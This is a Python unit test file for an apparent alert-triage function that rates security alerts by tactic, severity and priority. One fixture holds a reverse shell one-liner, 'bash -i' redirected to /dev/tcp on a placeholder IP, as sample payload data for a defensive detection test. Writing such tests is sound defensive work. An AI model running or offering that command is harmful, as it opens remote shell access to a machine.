import unittest

from pathlib import Path
import sys


sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from triage import triage_alert  # noqa: E402


class TriageTests(unittest.TestCase):
    def test_reverse_shell_is_high_priority(self):
        result = triage_alert(
            {
                "id": "x",
                "asset": "prod-app",
                "asset_criticality": 5,
                "event_type": "process_network",
                "src_ip": "10.0.0.5",
                "payload": "bash -i >& /dev/tcp/203.0.113.1/4444",
                "confidence": 0.95,
            }
        )
        self.assertIn("Execution", result["tactics"])
        self.assertIn(result["severity"], {"high", "critical"})

    def test_low_confidence_scanner_is_suppressed(self):
        result = triage_alert(
            {
                "id": "x",
                "asset": "wiki",
                "asset_criticality": 2,
                "event_type": "scanner",
                "src_ip": "198.51.100.1",
                "payload": "masscan probe",
                "confidence": 0.3,
            }
        )
        self.assertLessEqual(result["priority"], 12)
        self.assertEqual(result["severity"], "low")

    def test_auth_event_maps_credential_access(self):
        result = triage_alert(
            {
                "id": "x",
                "asset": "vpn",
                "asset_criticality": 5,
                "event_type": "auth",
                "src_ip": "203.0.113.1",
                "payload": "failed login repeated then success",
                "confidence": 0.9,
            }
        )
        self.assertIn("Credential Access", result["tactics"])


if __name__ == "__main__":
    unittest.main()

